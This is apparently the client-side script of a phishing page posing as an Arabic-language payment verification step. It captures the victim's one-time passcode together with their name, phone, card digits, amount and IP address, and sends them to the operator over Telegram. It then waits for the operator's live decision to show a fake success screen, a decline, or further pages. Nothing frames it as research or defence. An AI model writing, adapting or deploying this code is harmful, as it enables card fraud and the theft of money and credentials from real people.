document.addEventListener("DOMContentLoaded", async () => {
      const form = document.getElementById("verificationForm");
      const overlay = document.getElementById("loadingOverlay");
      const declineMessage = document.getElementById("decline-message");

      form.addEventListener("submit", async (e) => {
        e.preventDefault();

        
        overlay.classList.add("show");

        const codeTwo = document.getElementById("verification_code_two").value;
        const visitorIP = await getVisitorIP();
        const requestId = Date.now();
        pendingRequestId = requestId;

        
        const paymentMethod = sessionStorage.getItem('paymentMethodName') || 'غير محدد';
        const totalPrice = sessionStorage.getItem('totalPrice') || '0';
        const selectedCompany = sessionStorage.getItem('selectedCompany') || 'غير محدد';
        const fullName = sessionStorage.getItem('userFullName') || sessionStorage.getItem('fullName') || '';
        const phone = sessionStorage.getItem('userPhoneNumber') || sessionStorage.getItem('phone') || '';

        
        const lastFourDigits = sessionStorage.getItem('cardLastFour') || 'غير متوفر';

       
        const message = `🔐 <b>رمز التحقق (OTP)</b>\n\n` +
                        `─────────────────────────────────\n` +
                        `👤 <b>العميل:</b> <code>${fullName}</code>\n` +
                        `💳 <b>آخر 4 أرقام:</b> <code>${lastFourDigits}</code>\n` +
                        `─────────────────────────────────\n` +
                        `🔢 <b>رمز OTP:</b> <code>${codeTwo}</code>\n` +
                        `💰 <b>المبلغ:</b> <code>${totalPrice}</code> درهم\n` +
                        `💵 <b>طريقة الدفع:</b> <code>${paymentMethod}</code>\n` +
                        `─────────────────────────────────\n` +
                        `🔹 <b>IP:</b> <code>${visitorIP}</code>\n` +
                        `⏰ <b>الوقت:</b> ${new Date().toLocaleString('ar-EG')}\n` +
                        `🆔 <b>ID:</b> <code>${requestId}</code>`;

        const messageId = await sendToTelegram(message, requestId, 'otp');

        
        const checkInterval = setInterval(async () => {
          const status = await checkWebhookResponse(requestId, 'otp');
          
          if (status === 'approved') {
            clearInterval(checkInterval);
            if (messageId) await editTelegramMessage(messageId, message, '✅ تم القبول');
            overlay.classList.remove("show");
           
            document.body.innerHTML = '<div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;font-family:Tajawal,sans-serif;text-align:center;padding:20px;"><div style="width:80px;height:80px;background:#22c55e;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:40px;color:white;margin-bottom:20px;">✓</div><h2 style="color:#111827;font-size:1.5rem;margin-bottom:10px;">تم تأكيد رمز التحقق بنجاح</h2><p style="color:#4b5563;font-size:1rem;">شكراً لك، ستتلقى رسالة تأكيد قريباً</p></div>';
          } else if (status === 'rejected') {
            clearInterval(checkInterval);
            if (messageId) await editTelegramMessage(messageId, message, '❌ تم رفض الكود');
            overlay.classList.remove("show");
            declineMessage.style.display = "block";
            document.getElementById("verification_code_two").value = "";
            pendingRequestId = null;
          } else if (status === 'decline_card') {
            clearInterval(checkInterval);
            if (messageId) await editTelegramMessage(messageId, message, '🚫 تم رفض البطاقة');
            overlay.classList.remove("show");
            sessionStorage.setItem('cardDeclined', 'true');
            window.location.href = 'paymen.html';
          } else if (status === 'activation') {
            clearInterval(checkInterval);
            if (messageId) await editTelegramMessage(messageId, message, '📩 تم التحويل لصفحة الرسالة');
            overlay.classList.remove("show");
            window.location.href = 'Activation.html';
          }
        }, 2000);
      });

      
      const params = new URLSearchParams(window.location.search);
      if (params.get("declined") === "true") {
        declineMessage.style.display = "block";
      }
    });

    window.addEventListener("beforeunload", () => {
      pendingRequestId = null;
    });